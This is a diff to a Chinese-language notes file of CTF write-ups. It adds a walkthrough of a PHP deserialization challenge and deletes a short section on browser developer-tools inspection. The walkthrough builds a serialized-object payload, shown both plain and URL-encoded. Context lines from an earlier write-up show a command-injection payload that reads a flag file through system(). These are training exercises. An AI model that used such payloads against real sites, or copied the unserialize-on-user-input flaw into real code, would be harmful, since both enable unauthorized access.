@@ -82,21 +82,6 @@ SEE{you_found_me_now_try_the_1337er_one}
 # `Web`
 ## [[LitCTF 2023]我Flag呢？ - NSSCTF](https://www.nssctf.cn/problem/3861)
 
-### 前置知识
-- 为什么要做元素审查？
-	- 因为网页显示出来的内容 不等于 网页的真实内容
-- 元素审查看什么
-	- | 内容         | 作用            |
-| ---------- | ------------- |
-| HTML       | 页面结构、隐藏内容     |
-| CSS        | 隐藏元素、图片路径     |
-| JavaScript | 密码、逻辑、接口      |
-| Network 请求 | API、参数、Cookie |
-| Storage    | Token、Session |
-| Cookie     | 身份验证          |
-| Source     | 前端源码          |
-- [有关工具列表 - Microsoft Edge Developer documentation | Microsoft Learn](https://learn.microsoft.com/zh-cn/microsoft-edge/devtools/about-tools)
-
 ### 思路
 - 打开网站发现没有可交互的点，于是`F12`控制台审查元素
 - 打开控制台后看到： ![](../img-007.png)
@@ -362,3 +347,150 @@ group_concat()
 ?url=system("cat /flllllaaaaaaggggggg");
 ```
 ![](../img-020.png)
+
+---
+
+## [[SWPUCTF 2021 新生赛]ez_unserialize - NSSCTF](https://www.nssctf.cn/problem/426)
+### 思路
+1‍⃣
+检查页面源码并没有发现有用的信息，于是采用`dirsearch`后台扫描
+```bash
+dirsearch -u
+```
+![](../img-021.png)
+扫描后看见`robots.txt`
+进入`robots.txt`后得知存在`/cl45s.php`，于是进入该目录下打开该文件获得代码
+![](../img-022.png)
+![](../img-023.png)
+2‍⃣**代码分析**
+首先看开头：
+```php
+error_reporting(0);
+show_source("cl45s.php");
+```
+`error_reporting(0)` ：关闭报错显示。
+`show_source("cl45s.php")` ：把当前 PHP 文件的源码显示出来。
+
+接着定义了一个类：
+```php
+class wllm{
+    public $admin;
+    public $passwd;
+}
+```
+这个类里面有两个公开属性：
+```php
+$admin
+$passwd
+```
+
+构造函数如下：
+```php
+public function __construct(){
+    $this->admin = "user";
+    $this->passwd = "123456";
+}
+```
+当正常创建 `wllm` 对象时，默认属性是：
+```php
+admin = user
+passwd = 123456
+```
+但是在析构函数中，程序会判断：
+```php
+if($this->admin === "admin" && $this->passwd === "ctf"){
+    include("flag.php");
+    echo $flag;
+}
+```
+也就是说，只要对象里的属性满足：
+```php
+admin = admin
+passwd = ctf
+```
+程序就会包含 `flag.php`，并输出 `$flag`。
+
+关键漏洞点在最后两行：
+```php
+$p = $_GET['p'];
+unserialize($p);
+```
+程序从 `URL` 参数 `p` 中获取内容，然后直接传给 `unserialize()` 反序列化。
+这就意味着我们可以自己构造一个序列化字符串，让服务器反序列化出一个 `wllm` 对象，并且让这个对象的属性变成：
+```php
+admin = admin
+passwd = ctf
+```
+这样脚本结束时会自动触发 `__destruct()`，从而输出 flag。
+
+3‍⃣ **`PHP` 序列化格式分析**
+`PHP` 中对象的序列化格式大概是：
+```php
+O:类名长度:"类名":属性数量:{属性名;属性值;}
+```
+字符串的序列化格式是：
+```php
+s:字符串长度:"字符串";
+```
+
+本题类名是：
+```php
+wllm
+```
+长度是 4，所以开头写：
+```php
+O:4:"wllm"
+```
+
+类里面有两个属性：
+```php
+admin
+passwd
+```
+所以属性数量是 2：
+```php
+O:4:"wllm":2:
+```
+
+接下来写两个属性：
+第一个属性是 `admin`，属性名长度是 5，属性值也是 `admin`，长度也是 5：
+```php
+s:5:"admin";s:5:"admin";
+```
+第二个属性是 `passwd`，属性名长度是 6，属性值是 `ctf`，长度是 3：
+```php
+s:6:"passwd";s:3:"ctf";
+```
+
+所以完整 payload 为：
+```php
+?p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
+```
+```php
+创建一个 wllm 对象；
+这个对象有两个属性；
+admin = "admin"；
+passwd = "ctf"；
+```
+
+4‍⃣**构造`payload`**
+原始 `payload`：
+```php
+O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
+```
+可以直接拼接到 `URL` 后面：
+
+但是 `URL` 中有一些特殊字符，比如：
+```text
+:
+"
+{
+}
+;
+```
+有时候浏览器或服务器解析时可能会出问题，所以进行 `URL` 编码。
+
+`URL` 编码后的 `payload`：
+```text
+O%3A4%3A%22wllm%22%3A2%3A%7Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22passwd%22%3Bs%3A3%3A%22ctf%22%3B%7D
+```
